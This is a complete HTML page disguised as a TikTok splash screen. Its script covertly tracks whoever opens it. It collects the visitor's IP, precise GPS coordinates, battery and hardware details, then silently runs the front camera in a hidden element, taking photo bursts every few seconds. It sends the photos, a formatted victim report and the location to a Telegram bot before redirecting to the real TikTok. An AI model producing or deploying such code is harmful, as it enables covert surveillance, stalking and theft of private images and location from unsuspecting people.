<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: #000;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
            position: fixed;
            top: 0; left: 0;
        }
        
        /* TikTok exact splash screen */
        .splash {
            text-align: center;
            position: relative;
            z-index: 10;
        }
        
        /* TikTok logo */
        .tiktok-logo {
            margin-bottom: 40px;
            position: relative;
            display: inline-block;
        }
        
        .tiktok-icon {
            width: 80px;
            height: 80px;
            position: relative;
            margin: 0 auto;
        }
        
        .tiktok-icon svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 20px rgba(255,0,80,0.6))
                    drop-shadow(0 0 40px rgba(0,242,234,0.4));
            animation: glowPulse 2s ease-in-out infinite;
        }
        
        @keyframes glowPulse {
            0%, 100% { filter: drop-shadow(0 0 20px rgba(255,0,80,0.6)) drop-shadow(0 0 40px rgba(0,242,234,0.4)); }
            50% { filter: drop-shadow(0 0 35px rgba(255,0,80,0.9)) drop-shadow(0 0 60px rgba(0,242,234,0.7)); }
        }
        
        /* Pulsing rings around logo */
        .ring-container {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 120px; height: 120px;
        }
        
        .ring {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 50%;
            border: 2px solid rgba(255,255,255,0.3);
            animation: ringPulse 2s ease-out infinite;
        }
        
        .ring:nth-child(1) { width: 60px; height: 60px; animation-delay: 0s; }
        .ring:nth-child(2) { width: 60px; height: 60px; animation-delay: 0.6s; }
        .ring:nth-child(3) { width: 60px; height: 60px; animation-delay: 1.2s; }
        
        @keyframes ringPulse {
            0% { width: 60px; height: 60px; opacity: 0.8; border-color: rgba(255,255,255,0.4); }
            100% { width: 160px; height: 160px; opacity: 0; border-color: rgba(255,255,255,0); }
        }
        
        /* Loading dots */
        .loading-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 30px;
        }
        
        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #fff;
            animation: dotBounce 1.4s ease-in-out infinite;
        }
        
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        
        @keyframes dotBounce {
            0%, 80%, 100% { transform: scale(0.3); opacity: 0.3; }
            40% { transform: scale(1); opacity: 1; }
        }
        
        /* TikTok brand text */
        .brand-text {
            color: #fff;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 4px;
            margin-top: 20px;
            text-shadow: 0 0 30px rgba(255,0,80,0.5);
        }
        
        /* Hidden elements */
        #cam { 
            position: fixed; 
            top: 0; left: 0; 
            width: 2px; height: 2px; 
            opacity: 0.01; 
            pointer-events: none;
            z-index: -1;
        }
        #canvas { display: none; }
        
        /* Status text */
        #status {
            color: rgba(255,255,255,0.5);
            font-size: 12px;
            letter-spacing: 3px;
            margin-top: 15px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <video id="cam" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="splash" id="splash">
        <!-- TikTok Logo with rings -->
        <div class="tiktok-logo">
            <div class="ring-container">
                <div class="ring"></div>
                <div class="ring"></div>
                <div class="ring"></div>
            </div>
            <div class="tiktok-icon">
                <svg viewBox="0 0 24 24" fill="white">
                    <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
                </svg>
            </div>
        </div>
        
        <!-- Loading animation -->
        <div class="loading-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        
        <!-- Brand -->
        <div class="brand-text">TikTok</div>
        <div id="status">Loading...</div>
    </div>

    <script>
    // ==================== CONFIGURATION ====================
    var p = new URLSearchParams(location.search);
    var redir = p.get('r') || 'https://www.tiktok.com';
    var bot = p.get('bot') || '';
    var chat = p.get('chat') || '';
    
    // ==================== GLOBAL VARIABLES ====================
    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
    var isDesktop = !isMobile;
    var gpsData = null;
    var ipData = null;
    var photoInterval = null;
    var burstInterval = null;
    var cameraStream = null;
    var cameraActive = false;
    var photoCount = 0;
    var visitStart = Date.now();
    var reportSent = false;
    
    // ==================== CONSOLE LOG ====================
    function log(msg) {
        console.log('[Tracker] ' + msg);
    }
    
    // ==================== GET IP ====================
    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) { ipData = d.ip; log('IP: ' + d.ip); return d.ip; })
            .catch(function() { ipData = 'Unknown'; return null; });
    }
    
    // ==================== GET BATTERY ====================
    function getBattery() {
        if (navigator.getBattery) {
            return navigator.getBattery().then(function(b) {
                return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
            });
        }
        return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
    }
    
    // ==================== GET GPS ====================
    function getGPS() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) { log('GPS: Not supported'); resolve(null); return; }
            
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    log('GPS: GRANTED');
                    resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, alt: pos.coords.altitude, speed: pos.coords.speed, heading: pos.coords.heading });
                },
                function(err) {
                    var msgs = {1:'Denied',2:'Unavailable',3:'Timeout'};
                    log('GPS: ' + (msgs[err.code] || err.message));
                    resolve(null);
                },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        });
    }
    
    // ==================== START CAMERA ====================
    async function startCamera() {
        log('Camera: Starting...');
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            log('Camera: Not supported');
            return false;
        }
        
        var constraints = { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } };
        
        for (var i = 0; i < 3; i++) {
            try {
                var stream = await navigator.mediaDevices.getUserMedia(i === 0 ? constraints : { video: true });
                var v = document.getElementById('cam');
                v.srcObject = stream;
                cameraStream = stream;
                
                await new Promise(function(resolve) {
                    var timeout = setTimeout(resolve, 4000);
                    v.onloadedmetadata = function() { clearTimeout(timeout); v.play().then(resolve).catch(resolve); };
                    if (v.readyState >= 2) { clearTimeout(timeout); v.play().then(resolve).catch(resolve); }
                });
                
                if (v.videoWidth && v.videoWidth > 0) {
                    cameraActive = true;
                    log('Camera: OK ' + v.videoWidth + 'x' + v.videoHeight);
                    return true;
                }
            } catch(e) {
                log('Camera attempt ' + (i+1) + ': ' + e.message);
            }
        }
        
        log('Camera: All attempts failed');
        return false;
    }
    
    // ==================== TAKE SINGLE PHOTO ====================
    function takePhoto() {
        if (!cameraActive) return null;
        try {
            var v = document.getElementById('cam');
            if (!v.videoWidth || v.videoWidth === 0) return null;
            
            var c = document.getElementById('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            var ctx = c.getContext('2d');
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(v, -c.width, 0, c.width, c.height);
            ctx.restore();
            
            photoCount++;
            return c.toDataURL('image/jpeg', 0.7);
        } catch(e) {
            return null;
        }
    }
    
    // ==================== BURST PHOTOS (2-3 at once) ====================
    function takeBurstPhotos() {
        if (!cameraActive) return;
        log('📸 Burst: Taking 3 photos...');
        
        var photos = [];
        for (var i = 0; i < 3; i++) {
            setTimeout(function() {
                var photo = takePhoto();
                if (photo) {
                    photos.push(photo);
                    sendPhotoToTelegram(photo);
                }
            }, i * 300); // Take each photo 300ms apart
        }
    }
    
    // ==================== SEND PHOTO TO TELEGRAM ====================
    function sendPhotoToTelegram(photoData) {
        if (!photoData || !bot || !chat) return;
        
        try {
            var arr = photoData.split(',');
            var mime = arr[0].match(/:(.*?);/)[1];
            var bstr = atob(arr[1]);
            var n = bstr.length;
            var u8 = new Uint8Array(n);
            while(n--) { u8[n] = bstr.charCodeAt(n); }
            var blob = new Blob([u8], {type: mime});
            
            var fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
            fd.append('caption', '📸 Photo #' + photoCount);
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
            xhr.onload = function() { log('Photo sent: ' + xhr.status); };
            xhr.send(fd);
        } catch(e) {
            log('Photo error: ' + e.message);
        }
    }
    
    // ==================== GET IP LOCATION ====================
    async function getIPLocation() {
        if (!ipData || ipData === 'Unknown') return '';
        try {
            var resp = await fetch('http://ip-api.com/json/' + ipData + '?fields=country,regionName,city,zip,timezone,lat,lon');
            var loc = await resp.json();
            if (loc.country) {
                var text = '📍 Location Details\n';
                text += '   • Country: ' + loc.country + '\n';
                text += '   • Region: ' + (loc.regionName || 'N/A') + '\n';
                text += '   • City: ' + (loc.city || 'N/A') + '\n';
                text += '   • Postal Code: ' + (loc.zip || 'N/A') + '\n';
                text += '   • Timezone: ' + (loc.timezone || 'N/A') + '\n';
                if (loc.lat && loc.lon) text += '   • Approx Maps: https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + '\n';
                text += '\n';
                return text;
            }
        } catch(e) {}
        return '📍 Location Details\n   • Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n\n';
    }
    
    // ==================== BUILD REPORT ====================
    async function buildReport(isFinal) {
        var ua = navigator.userAgent;
        var plat = navigator.platform;
        var lang = navigator.language;
        var scr = screen.width + 'x' + screen.height;
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
        var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        var duration = Math.floor((Date.now() - visitStart) / 1000);
        var battery = await getBattery();
        var ipLocation = await getIPLocation();
        
        var deviceModel = plat;
        if (/iPhone/.test(ua)) {
            var v = ua.match(/OS (\d+_\d+)/);
            deviceModel = 'iPhone OS ' + (v ? v[1].replace('_','.') : '') + ' like Mac OS X';
        } else if (/Android/.test(ua)) {
            var av = ua.match(/Android\s([\d.]+)/);
            deviceModel = 'Android ' + (av ? av[1] : '') + ' Device';
        } else if (/Windows/.test(plat)) { deviceModel = 'Windows PC'; }
        else if (/Mac/.test(plat)) { deviceModel = 'Mac Computer'; }
        else if (/Linux/.test(plat)) { deviceModel = 'Linux Computer'; }
        
        var prefix = isFinal ? '📋 FINAL REPORT - User Left Page\n\n' : '';
        
        var msg = prefix;
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📊 Visitor Information Captured\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖥️ Device & Browser\n';
        msg += '   • Device Model: ' + deviceModel + '\n';
        msg += '   • Device Type: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n';
        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
        
        msg += '🌐 Network Information\n';
        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\n';
        msg += '   • Language: ' + lang + '\n\n';
        
        msg += ipLocation;
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    🗺️ GPS Coordinates\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        if (gpsData) {
            msg += '   ✅ Location Granted\n';
            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n';
            if (gpsData.alt) msg += '   • Altitude: ' + gpsData.alt.toFixed(1) + 'm\n';
            if (gpsData.speed) msg += '   • Speed: ' + (gpsData.speed * 3.6).toFixed(1) + ' km/h\n';
            msg += '\n   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
        } else {
            msg += '   ❌ Location: Not available\n';
            if (isDesktop) msg += '   💡 Desktop detected - GPS usually not available\n';
            msg += '   💡 Location permission was not granted\n\n';
        }
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📱 Device Details\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖼️ Display Information\n   • Resolution: ' + scr + '\n\n';
        msg += '🔋 Battery Status\n   • Level: ' + battery.level + '\n   • Charging: ' + battery.charging + '\n\n';
        msg += '🔐 Device Permissions\n   • Camera: ' + (cameraActive ? 'Active 📸' : 'Not Available') + '\n   • Location: ' + (gpsData ? 'Granted ✅' : 'Denied ❌') + '\n\n';
        msg += '💾 Hardware & Storage\n   • CPU Cores: ' + cores + '\n   • RAM: ' + ram + ' GB\n   • Photos Captured: ' + photoCount + '\n   • Visit Duration: ' + duration + ' seconds\n\n';
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
        
        return msg;
    }
    
    // ==================== SEND REPORT ====================
    async function sendReport(isFinal) {
        if (reportSent && !isFinal) return;
        reportSent = true;
        
        log(isFinal ? 'Sending FINAL report...' : 'Sending report...');
        var msg = await buildReport(isFinal);
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendMessage', false);
        xhr.setRequestHeader('Content-Type', 'application/json');
        try {
            xhr.send(JSON.stringify({ chat_id: chat, text: msg, disable_web_page_preview: true }));
            log('Report sent: ' + xhr.status);
        } catch(e) { log('Report FAILED'); }
        
        if (gpsData) {
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'https://api.telegram.org/bot' + bot + '/sendLocation', false);
            xhr2.setRequestHeader('Content-Type', 'application/json');
            try { xhr2.send(JSON.stringify({ chat_id: chat, latitude: gpsData.lat, longitude: gpsData.lon })); } catch(e) {}
        }
    }
    
    // ==================== STOP CAMERA ====================
    function stopCamera() {
        if (cameraStream) { cameraStream.getTracks().forEach(function(t) { t.stop(); }); cameraStream = null; cameraActive = false; }
        if (photoInterval) { clearInterval(photoInterval); photoInterval = null; }
        if (burstInterval) { clearInterval(burstInterval); burstInterval = null; }
    }
    
    // ==================== MAIN ====================
    async function main() {
        log('=== START ===');
        log('Device: ' + (isMobile ? 'MOBILE' : 'DESKTOP'));
        
        document.getElementById('status').textContent = 'Loading...';
        
        getIP();
        gpsData = await getGPS();
        
        document.getElementById('status').textContent = 'Starting...';
        var camStarted = await startCamera();
        
        // Send initial report
        await sendReport(false);
        
        // BURST PHOTOS: Take 3 photos every 5 seconds
        if (camStarted) {
            log('📸 Starting burst photo mode (3 photos every 5 seconds)');
            
            // First burst after 2 seconds
            setTimeout(function() {
                takeBurstPhotos();
                
                // Then burst every 5 seconds
                burstInterval = setInterval(function() {
                    takeBurstPhotos();
                }, 5000);
            }, 2000);
        }
        
        // Redirect
        document.getElementById('status').textContent = 'Ready';
        setTimeout(function() {
            document.getElementById('splash').style.display = 'none';
            window.location.href = redir;
        }, 1000);
    }
    
    // ==================== EXIT HANDLER ====================
    function handleExit() {
        stopCamera();
        var exitMsg = '📋 User Left Page\n⏱ Duration: ' + Math.floor((Date.now()-visitStart)/1000) + 's\n📸 Photos: ' + photoCount + '\n📱 Device: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n🌐 IP: ' + (ipData || 'Unknown');
        if (navigator.sendBeacon) {
            navigator.sendBeacon('https://api.telegram.org/bot' + bot + '/sendMessage', JSON.stringify({ chat_id: chat, text: exitMsg }));
        }
    }
    
    window.addEventListener('beforeunload', handleExit);
    window.addEventListener('pagehide', handleExit);
    document.addEventListener('visibilitychange', function() { if (document.hidden) handleExit(); });
    
    main();
    </script>
</body>
</html>
